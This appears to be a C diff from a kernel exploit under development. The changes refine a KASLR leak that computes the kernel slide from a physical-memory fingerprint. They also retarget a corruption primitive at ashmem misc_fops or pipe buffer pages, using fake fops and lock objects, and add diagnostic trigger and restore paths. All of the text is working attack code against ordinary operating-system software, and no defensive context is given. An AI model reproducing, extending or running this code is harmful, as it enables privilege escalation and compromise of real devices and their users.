@@ -85,7 +85,14 @@ int slide_pselect_words_per_set(void) {
 }
 
 int slide_pselect_global_word(int waiter_word) {
-  return SLIDE_PSELECT_WORD_SHIFT + waiter_word;
+  static int shift = -1;
+  if (shift < 0) {
+    const char *arg = getenv("SLIDE_WORD_SHIFT");
+    shift = (arg && *arg) ? atoi(arg) : SLIDE_PSELECT_WORD_SHIFT;
+    pr_info("slide pselect word shift=%d (env=%s)\n", shift,
+            arg && *arg ? arg : "default");
+  }
+  return shift + waiter_word;
 }
 
 int slide_pselect_put_global_word(
@@ -330,7 +337,7 @@ void slide_pselect_stack_copy(void) {
           atomic_load(&slide_consume_last_sched_ret),
           atomic_load(&slide_consume_last_sched_errno));
   atomic_store(&slide_pselect_write_window,
-               ret > 0 && atomic_load(&slide_consume_sched_ok) > 0);
+               atomic_load(&slide_consume_sched_ok) > 0);
 
   close(high_read);
   if (block_fd != pipefd[0]) {
@@ -641,7 +648,7 @@ static int slide_trigger_physical_state(void) {
   return ok;
 }
 
-static int slide_trigger_physical_slot(size_t slot) {
+int slide_trigger_physical_slot(size_t slot) {
   if (!select_slide_payload_index(slot)) {
     return 0;
   }
@@ -662,7 +669,7 @@ static int slide_trigger_physical_slot(size_t slot) {
   return 0;
 }
 
-static int slide_restore_physical_oracle(void) {
+int slide_restore_physical_oracle(void) {
   int gate_restored =
       slide_trigger_physical_slot(P0_ORACLE_GATE_RESTORE_SLOT);
   int probe_restored =
@@ -740,7 +747,14 @@ static int slide_leak_physical_base(void) {
   }
   size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
   pr_success("p0 physical elapsed_ms=%zu\n", elapsed_ms);
-  return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
+  /* The fingerprint scan returns X = the ELF offset found at the FIXED
+   * probe phys page.  The kernel image is physically loaded at
+   * 0x28000000 + va_slide, so the probe phys 0x281f0000 contains
+   * X = 0x1f0000 - va_slide.  Convert: va_slide = 0x1f0000 - X. */
+  uintptr_t va_slide = P0_ORACLE_PROBE_OFFSET - offset;
+  pr_info("p0 fingerprint offset=%08zx -> va_slide=%08zx\n",
+          offset, va_slide);
+  return slide_commit_stext(KIMAGE_TEXT_BASE + va_slide, "physical");
 }
 
 static void dump_p0_oracle_words(int fd, const char *phase,
@@ -815,8 +829,9 @@ static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
   uintptr_t lock = payload_base + SLIDE_BANK_LOCK_OFF;
   uintptr_t waiter = lock + SLIDE_BANK_WAITER_OFF;
   uintptr_t parent = direct_to_page(payload_base);
-  uintptr_t target = pipebuf_page_base +
-                     P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
+  uintptr_t target = data_addr(ASHMEM_MISC_FOPS);
+  // uintptr_t target = pipebuf_page_base +
+  //                    P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
   static const char marker[] = "RMG-P0-ORACLE-GATE";
   uintptr_t marker_address = payload_base + P0_ORACLE_GATE_PAGE_OFF;
   if (getenv("P0_ORACLE_READ_DIAG")) {
@@ -954,7 +969,51 @@ int slide_leak_kernel_base(void) {
       }
     }
     pr_info("slide forced p0 offset=%08llx\n", value);
-    return slide_commit_stext(KIMAGE_TEXT_BASE + value, "forced");
+    int committed = slide_commit_stext(KIMAGE_TEXT_BASE + value, "forced");
+    if (committed && getenv("P0_ORACLE_GATE_DIAG")) {
+      pr_info("slide forced offset gate diagnostic starting\n");
+      if (!prepare_p0_pipe_oracle()) {
+        pr_error("p0 gate diag pipe preparation failed\n");
+        return 0;
+      }
+      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+      if (!page_base) {
+        pr_error("p0 gate diag fops page preparation failed\n");
+        return 0;
+      }
+      /* Redirect slot 0 target from misc_fops to a pipe buffer page so
+         the FOPS-page trigger can be verified via the pipe oracle without
+         needing fake_fops/configfs.  This isolates trigger vs target. */
+      uintptr_t pipe_target = pipebuf_page_base +
+                              P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
+      uintptr_t misc_fops_target = data_addr(ASHMEM_MISC_FOPS);
+      /* Test 1: override both parent and target to match SLIDE page values */
+      uintptr_t slide_parent = direct_to_page(page_base);
+      pr_info("p0 gate diag FOPS trigger -> pipe target=%016zx "
+              "(original misc_fops=%016zx)\n",
+              pipe_target, misc_fops_target);
+      pr_info("p0 gate diag parent override: fake_fops=%016zx -> "
+              "page_struct=%016zx\n",
+              (uintptr_t)fake_fops, slide_parent);
+      if (!select_slide_payload_index(0)) {
+        pr_error("p0 gate diag select_slide_payload_index failed\n");
+        return 0;
+      }
+      slide_oracle_parent = slide_parent;
+      slide_oracle_target = pipe_target;
+      pr_info("p0 gate diag running fops slide route parent=%016zx "
+              "target=%016zx lock=%016zx\n",
+              slide_oracle_parent, slide_oracle_target, fake_lock);
+      int triggered = slide_trigger_physical_state();
+      int gate_result = verify_p0_pipe_oracle_gate();
+      pr_info("p0 gate diag FOPS trigger result=%d triggered=%d\n",
+              gate_result, triggered);
+      if (gate_result != 0) {
+        slide_restore_physical_oracle();
+      }
+      return 0;
+    }
+    return committed;
   }
   return slide_leak_physical_base();
 #else
